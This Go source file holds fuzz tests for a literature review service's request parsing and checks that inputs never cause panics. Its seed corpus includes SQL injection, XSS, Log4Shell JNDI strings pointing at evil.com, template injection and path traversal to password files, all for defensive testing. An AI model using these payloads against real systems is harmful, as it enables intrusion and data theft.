// Package security provides fuzz tests for the literature review service's
// input handling. The primary invariant is that no input should cause a panic
// in JSON parsing, domain validation, or request processing.
package security

import (
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

// startReviewRequest mirrors the HTTP handler's request struct for fuzz testing
// without importing the internal httpserver package.
type startReviewRequest struct {
	Query               string   `json:"query"`
	InitialKeywordCount *int     `json:"initial_keyword_count,omitempty"`
	PaperKeywordCount   *int     `json:"paper_keyword_count,omitempty"`
	MaxExpansionDepth   *int     `json:"max_expansion_depth,omitempty"`
	SourceFilters       []string `json:"source_filters,omitempty"`
	DateFrom            *string  `json:"date_from,omitempty"`
	DateTo              *string  `json:"date_to,omitempty"`
}

// maxQueryLength matches the constant in the HTTP handler package.
const maxQueryLength = 10000

// FuzzStartReviewQuery tests that arbitrary input to the query field never
// causes a panic during JSON encoding/decoding or basic validation logic.
// This exercises the same code paths that a real HTTP request would traverse
// before reaching any database layer.
func FuzzStartReviewQuery(f *testing.F) {
	// Seed corpus with interesting edge cases.
	seeds := []string{
		// SQL injection payloads
		"'; DROP TABLE papers; --",
		"1 OR 1=1",
		"' UNION SELECT * FROM users --",
		"Robert'); DROP TABLE students;--",

		// XSS payloads
		"<script>alert('xss')</script>",
		`<img src=x onerror=alert('xss')>`,
		`<svg/onload=alert('xss')>`,

		// Null bytes and control characters
		"query\x00with\x00nulls",
		"query\nwith\nnewlines",
		"query\twith\ttabs",
		"query\rwith\rcarriage\rreturns",

		// Unicode edge cases
		"",
		"\u200B", // zero-width space
		"\uFEFF", // BOM
		"\uFFFD", // replacement character
		"\U0001F4A9",                      // emoji (pile of poo)
		"Sch\u00f6dinger's cat",           // umlaut
		"\u202Eright-to-left\u202C",       // RTL override
		"\u0000\u0001\u0002\u0003",        // low control chars
		string([]byte{0xfe, 0xff}),        // invalid UTF-8

		// Long strings
		strings.Repeat("a", maxQueryLength),
		strings.Repeat("a", maxQueryLength+1),
		strings.Repeat("\u00e9", 5000), // multi-byte characters

		// JNDI / Log4Shell
		"${jndi:ldap://evil.com/a}",
		"${jndi:rmi://evil.com/a}",

		// Template injection
		"{{.Env.SECRET}}",
		"${7*7}",
		"#{7*7}",

		// Path traversal
		"../../etc/passwd",
		"..\\..\\windows\\system32\\config\\sam",

		// JSON special characters
		`{"nested": "json"}`,
		`"already quoted"`,
		"\\n\\t\\r\\0",

		// Empty and whitespace
		"",
		" ",
		"   ",
		"\t\n\r",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, query string) {
		// Invariant 1: JSON round-trip must never panic.
		req := startReviewRequest{Query: query}
		encoded, err := json.Marshal(req)
		if err != nil {
			// json.Marshal can fail for some inputs; that is fine as long
			// as it does not panic.
			return
		}

		var decoded startReviewRequest
		if err := json.Unmarshal(encoded, &decoded); err != nil {
			// Unmarshal failure is acceptable; a panic is not.
			return
		}

		// Invariant 2: For valid UTF-8 input, the decoded query must be
		// identical to the original after a successful round-trip.
		// Invalid UTF-8 is replaced with U+FFFD by json.Marshal (Go 1.13+),
		// which is expected and safe behavior.
		if utf8.ValidString(query) && decoded.Query != query {
			t.Errorf("JSON round-trip changed valid UTF-8 query:\n  original: %q\n  decoded:  %q", query, decoded.Query)
		}

		// Invariant 3: Validation logic must never panic.
		trimmed := strings.TrimSpace(query)
		_ = len(trimmed) > maxQueryLength
		_ = trimmed == ""
		_ = utf8.ValidString(trimmed)

		// Invariant 4: Constructing a JSON body from fuzzed input
		// and attempting to unmarshal it must not panic.
		rawBody := `{"query":` + string(encoded[len(`{"query":`):len(encoded)-1]) + `}`
		var fromRaw startReviewRequest
		_ = json.Unmarshal([]byte(rawBody), &fromRaw)

		// Invariant 5: Building a full request body with all optional
		// fields set from the fuzzed query must not panic.
		intVal := 10
		fullReq := startReviewRequest{
			Query:               query,
			InitialKeywordCount: &intVal,
			PaperKeywordCount:   &intVal,
			MaxExpansionDepth:   &intVal,
			SourceFilters:       []string{query}, // use fuzzed input as source filter too
			DateFrom:            &query,           // intentionally wrong type for stress
			DateTo:              &query,
		}
		fullEncoded, err := json.Marshal(fullReq)
		if err != nil {
			return
		}

		var fullDecoded startReviewRequest
		_ = json.Unmarshal(fullEncoded, &fullDecoded)
	})
}

// FuzzJSONPayload tests that arbitrary bytes sent as a JSON request body
// never cause a panic in the JSON unmarshaling path.
func FuzzJSONPayload(f *testing.F) {
	// Seed with valid and malformed JSON payloads.
	f.Add([]byte(`{"query":"valid query"}`))
	f.Add([]byte(`{}`))
	f.Add([]byte(`{"query":""}`))
	f.Add([]byte(`{"query":null}`))
	f.Add([]byte(`{"query":123}`))
	f.Add([]byte(`{"query":true}`))
	f.Add([]byte(`{"query":[]}`))
	f.Add([]byte(`not json at all`))
	f.Add([]byte(`{"query":"a","extra":"b"}`))
	f.Add([]byte{0x00})
	f.Add([]byte{0xff, 0xfe})
	f.Add([]byte(`{"query": "` + strings.Repeat("a", 100000) + `"}`))
	f.Add([]byte(`{` + strings.Repeat(`"k":`, 100) + `"v"}`))

	f.Fuzz(func(t *testing.T, data []byte) {
		// Invariant: Unmarshal must never panic regardless of input.
		var req startReviewRequest
		_ = json.Unmarshal(data, &req)

		// If we got a query, validate it does not panic.
		if req.Query != "" {
			trimmed := strings.TrimSpace(req.Query)
			_ = len(trimmed) > maxQueryLength
			_ = utf8.ValidString(trimmed)
		}
	})
}
